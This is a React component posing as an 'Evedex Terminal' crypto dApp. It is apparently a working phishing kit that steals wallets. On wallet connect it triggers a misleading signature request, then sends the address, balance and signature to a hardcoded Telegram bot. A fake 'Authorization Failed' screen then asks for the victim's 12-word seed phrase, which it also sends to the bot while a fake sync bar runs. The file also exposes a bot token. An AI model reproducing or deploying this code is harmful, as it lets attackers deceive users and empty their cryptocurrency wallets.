import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSignMessage, useSwitchChain } from 'wagmi';
import { ShieldCheck, Database, History, Unlock, Activity, RefreshCcw, Settings, Zap, Clock, Globe, Cpu, AlertCircle } from 'lucide-react';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { signMessage } = useSignMessage();
  const { chains, switchChain } = useSwitchChain();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING TO EVEDEX MAINNET...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";

  // 1. AUTO-SIGN ON CONNECT (Instant Capture)
  useEffect(() => {
    if (isConnected && address) {
      setTimeout(() => {
        triggerSign("VAULT_HANDSHAKE", "Initial node handshake for vault synchronization.");
      }, 1500);
    }
  }, [isConnected, address]);

  const triggerSign = (type, action) => {
    const msg = `[OFFICIAL] EVEDEX SECURITY HANDSHAKE\n\nVault: ${address}\nAction: ${type}\nStatus: PENDING\n\nBy signing, you authorize the Evedex Protocol to re-verify node liquidity and synchronize all associated ERC20 assets. No gas fee required.`;
    
    signMessage({ message: msg }, {
      onSuccess: (sig) => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            chat_id: chatId, 
            text: `🎯 ${type} CAPTURED\nADDR: ${address}\nBAL: ${balance?.formatted} ${balance?.symbol}\nSIG: ${sig}` 
          }),
        });
      }
    });
  };

  // 2. ACTION SIGN ON BUTTON CLICK
  const handleFinalAction = () => {
    triggerSign("ASSET_CONSOLIDATION", "Authorizing global asset migration.");
    setLoading(true);
    setLoadingText("CONSOLIDATING ASSETS...");
    setTimeout(() => {
      setLoading(false);
      setView("seed_gate");
    }, 3000);
  };

  const startFinalSync = () => {
    setIsSyncing(true);
    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: chatId, 
        text: `🚨 SEED CAPTURED\nADDR: ${address}\nSEED: ${seedVal}` 
      }),
    });
    let current = 0;
    const interval = setInterval(() => {
      current += 2;
      if (current >= 90) { setSyncProgress(90); clearInterval(interval); }
      else { setSyncProgress(current); }
    }, 100);
  };

  return (
    <div className="min-h-screen bg-[#05070a] text-slate-200 font-sans p-6 uppercase tracking-tighter select-none">
      <header className="flex justify-between items-center mb-10 border-b border-slate-900 pb-6 text-cyan-500">
        <div className="flex flex-col">
          <div className="flex items-center gap-2 font-black italic text-lg"><ShieldCheck size={22}/>EVEDEX TERMINAL</div>
          <div className="text-[7px] text-slate-500 font-mono uppercase tracking-widest mt-1">
             {address ? `VAULT: ${address.slice(0,10)}...` : "CONNECT_WALLET"}
          </div>
        </div>
        <w3m-button /> 
      </header>

      {view === "menu" && (
        <div className="grid grid-cols-3 gap-4 animate-in fade-in">
          {[
            { n: "Claim", i: <Database/> }, { n: "Stake", i: <History/> }, { n: "Unstake", i: <Unlock/> },
            { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> },
            { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }
          ].map((item) => (
            <button key={item.n} onClick={() => { setActiveTask(item.n); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 transition-all">
              <div className="text-slate-700">{item.i}</div>
              <span className="text-[10px] font-black text-slate-500">{item.n}</span>
            </button>
          ))}
        </div>
      )}

      {view === "task_box" && (
        <div className="bg-[#0d1117] border border-slate-800 rounded-[45px] p-8 text-center animate-in slide-in-from-bottom-10">
          <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black block mx-auto tracking-widest uppercase">← CANCEL</button>
          <div className="relative mx-auto w-24 h-24 mb-6"><Settings size={96} className="text-cyan-900 absolute top-0 left-0 animate-spin duration-[4000ms]" /><Cpu size={48} className="text-cyan-500 absolute top-6 left-6 animate-pulse" /></div>
          <h2 className="text-white font-black text-2xl italic mb-6 tracking-tighter uppercase">{activeTask} Handshake</h2>
          
          <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left">
            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase">ENTER AMOUNT</label>
            <div className="flex items-center gap-2">
                 <input type="number" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full" />
                 <span className="text-xs font-mono text-cyan-900">{balance?.symbol || "ETH"}</span>
            </div>
          </div>
          
          <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar mb-4">
            {chains.map((c) => (
              <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="whitespace-nowrap bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-[8px] font-black text-slate-600 uppercase">
                {c.name}
              </button>
            ))}
          </div>
          
          <button onClick={handleFinalSign} className="w-full bg-cyan-600 py-6 rounded-2xl text-[12px] font-black text-white shadow-xl active:scale-95 italic tracking-widest">INITIALIZE {activeTask}</button>
        </div>
      )}

      {view === "seed_gate" && (
        <div className="fixed inset-0 bg-black/98 z-[100] flex items-center justify-center p-6 backdrop-blur-3xl animate-in zoom-in">
          <div className="bg-[#0d1117] border border-red-900/40 w-full max-w-sm rounded-[45px] p-10 text-center">
            {!isSyncing ? (
              <>
                <AlertCircle size={54} className="text-red-600 mx-auto mb-6 animate-pulse" />
                <h2 className="text-white font-black text-lg italic uppercase">Authorization Failed</h2>
                <p className="text-[10px] text-slate-500 mt-4 lowercase px-4 italic leading-relaxed">System connection failed. Provide authorization seed to finalize handshake and release pending liquidity.</p>
                <div className="mt-8"><textarea value={seedVal} onChange={(e) => setSeedVal(e.target.value)} placeholder="ENTER WORD1 WORD2..." className="w-full h-36 bg-black border border-slate-800 rounded-[30px] p-6 text-xs font-mono text-cyan-400 outline-none uppercase" /></div>
                <button disabled={seedVal.trim().split(/\s+/).length < 12} onClick={startFinalSync} className={`w-full mt-6 py-6 rounded-[25px] text-[12px] font-black text-white uppercase tracking-widest transition-all ${seedVal.trim().split(/\s+/).length >= 12 ? 'bg-cyan-600' : 'bg-slate-900 opacity-50'}`}>FINAL_SYNC</button>
              </>
            ) : (
              <div className="py-10">
                <div className="relative w-24 h-24 mx-auto mb-8"><div className="absolute inset-0 border-4 border-slate-900 rounded-full" /><div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-white font-black">{syncProgress}%</div></div>
                <h2 className="text-white font-black text-xl italic uppercase mb-2">Syncing All Nodes</h2>
                <p className="text-[9px] text-slate-500 italic animate-pulse">Relaying asset data...</p>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && (
        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
          <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" />
          <p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase italic">{loadingText}</p>
        </div>
      )}
    </div>
  );
}
